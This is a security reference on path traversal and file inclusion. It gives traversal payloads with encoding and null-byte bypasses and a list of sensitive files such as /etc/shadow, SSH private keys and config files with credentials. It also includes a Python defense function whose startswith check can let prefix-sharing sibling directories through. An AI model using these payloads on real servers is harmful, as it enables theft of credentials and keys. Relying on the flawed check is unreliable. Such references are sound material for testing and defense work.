# Web Security - Path Traversal and File Inclusion

> Source: WooYun Vulnerability Database | Split from web-file-infra.md

## II. Path Traversal and File Inclusion

### 2.1 Vulnerability Essence

```
User input space -> [Trust boundary failure] -> File system space
Core: Developers assume "user input = filename"; attackers treat "user input = path directive"
```

### 2.2 Vulnerable Parameter Identification

High-frequency parameter names (by occurrence frequency):

```
File-related:     filename, filepath, path, file, filePath, hdfile, inputFile
Download-related: download, down, attachment, attach, doc
Read-related:     read, load, get, fetch, open, input
Template-related: template, tpl, page, include, temp
General:          url, src, dir, folder, resource, name
```

High-risk feature points (TOP 5):
1. File download interface (27 occurrences) - `down.php, download.jsp`
2. File preview feature (17 occurrences) - `view.php, preview.jsp`
3. Attachment management (6 occurrences) - `attachment.php`
4. Image loading (5 occurrences) - `pic.php, image.jsp`
5. Log viewer (4 occurrences) - `log.php, viewlog.jsp`

### 2.3 Directory Traversal Payloads

Basic traversal:

```bash
../                          # Linux standard
..\..\                       # Windows standard
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```

Encoding bypass:

```bash
# URL single encoding
%2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/

# URL double encoding
%252e%252e%252f  |  ..%252f

# Unicode/UTF-8 overlong encoding (GlassFish specific)
%c0%ae%c0%ae/%c0%af

# Mixed encoding
..%2f  |  %2e%2e/  |  ..%c0%af
```

Special bypasses:

```bash
# Null byte truncation (PHP<5.3.4 / older Java versions)
../../../etc/passwd%00.jpg

# Question mark truncation
../../../WEB-INF/web.xml%3f

# Path obfuscation
....//  |  ....\/  |  ..\/  |  ./../../

# Absolute path / protocol bypass
/etc/passwd
file:///etc/passwd
file://localhost/etc/passwd
```

### 2.4 Sensitive File Path Quick Reference

Linux systems:

```bash
/etc/passwd                    # User list (preferred for verification)
/etc/shadow                    # Password hashes
/etc/hosts                     # Host mappings
/root/.ssh/id_rsa              # SSH private key
/root/.bash_history            # Command history
/proc/self/environ             # Process environment variables
/etc/nginx/nginx.conf          # Nginx configuration
/etc/my.cnf                    # MySQL configuration
```

Windows systems:

```bash
C:\windows\win.ini             # System config (preferred for verification)
C:\boot.ini                    # Boot config (XP/2003)
C:\inetpub\wwwroot\web.config  # IIS application config
C:\windows\system32\config\sam # SAM database
```

Java Web:

```bash
WEB-INF/web.xml                         # Core config (preferred for verification)
WEB-INF/classes/jdbc.properties          # Database config
WEB-INF/classes/applicationContext.xml   # Spring config
WEB-INF/classes/hibernate.cfg.xml        # Hibernate config
```

PHP applications:

```bash
config.php | config.inc.php | db.php | conn.php    # General config
wp-config.php                           # WordPress
config_global.php | config_ucenter.php  # Discuz
application/config/database.php         # CodeIgniter
```

ASP.NET:

```bash
web.config                 # Core config (contains connection strings)
../web.config              # Parent directory config
```

### 2.5 Defense Measures

```python
import os
def safe_file_access(user_input, base_dir):
    # 1. Path normalization
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    # 2. Verify the path is within the allowed directory
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")
    # 3. Whitelist extension validation
    # 4. Verify file exists
    return full_path
```

Key principles: Path normalization (realpath/normpath) -> Directory boundary check -> Whitelist validation -> Least privilege execution

---
